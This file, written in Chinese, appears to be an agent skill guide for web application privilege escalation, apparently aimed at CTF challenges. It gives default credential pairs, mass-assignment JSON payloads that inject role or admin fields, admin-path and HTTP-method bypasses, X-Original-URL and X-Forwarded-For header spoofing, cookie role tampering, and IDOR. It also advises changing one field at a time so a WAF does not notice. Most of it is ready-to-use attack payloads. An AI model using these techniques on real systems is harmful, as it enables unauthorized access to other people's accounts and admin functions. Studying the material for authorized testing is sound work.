---
name: privilege-escalation-web
description: "Web 应用层权限提升。当 Web 应用存在用户注册/登录、角色权限管理、API 参数传输用户身份信息时使用。覆盖 Mass Assignment（批量赋值）攻击、角色/权限字段注入、HTTP 方法/Header 绕过、Cookie/Session 篡改。注册后立即检查普通用户能否越权访问管理员功能——这是第一优先级"
metadata:
  tags: "privilege_escalation,mass_assignment,authorization,role-tampering,default_credentials,权限提升,越权,批量赋值,RBAC,admin bypass,角色,权限绕过"
  category: "exploit"
---

# Web 权限提升方法论

Web 权限提升和系统提权不同——不需要 exploit，只需要找到应用逻辑中的权限检查漏洞。

## ⛔ 深入参考（必读）

- Mass Assignment 字段清单、HTTP Header 篡改、Cookie 篡改 → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)

## Phase 1: 认证和账户发现

### 默认凭据（最快路径）
```
admin:admin, admin:password, admin:123456
root:root, root:toor, test:test, guest:guest
```

### 注册功能分析
注册新账户，用代理拦截请求，记录请求格式、发送字段、响应字段（可能暴露隐藏字段名）。
检查 `/docs`, `/swagger`, `/openapi.json`。

## Phase 2: Mass Assignment（核心技术）

在注册或更新请求中**添加应用未预期的字段**（每次只加一个）：
```json
{"username":"test", "password":"pass", "role":"admin"}
{"username":"test", "password":"pass", "is_admin":true}
{"username":"test", "password":"pass", "is_staff":1}
```

→ 完整字段清单和框架惯例 → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)

## Phase 3: 管理端点直接访问
```
GET /admin → 403? → 试 /admin/ (trailing slash) 或 /Admin (大小写)
GET /api/admin/users → 200?
```

## Phase 4: HTTP 方法/Header 篡改 + Cookie 篡改

```
GET /admin/flag → 403 → 试 POST/PUT/PATCH
Header: X-Original-URL: /admin/flag / X-Forwarded-For: 127.0.0.1
Cookie: role=user → role=admin / admin=0 → admin=1
```
→ 完整 payload 和 Flask session 伪造 → [references/web-privesc-techniques.md](references/web-privesc-techniques.md)

## Phase 5: 对象级越权
修改 URL/参数中的 ID 访问他人资源

## 注意事项
- Mass Assignment 每次只改一个字段——全改可能触发 WAF
- 注册后检查 `GET /api/users/me` 确认权限是否真的变了
- 结合 IDOR + Mass Assignment 效果更好
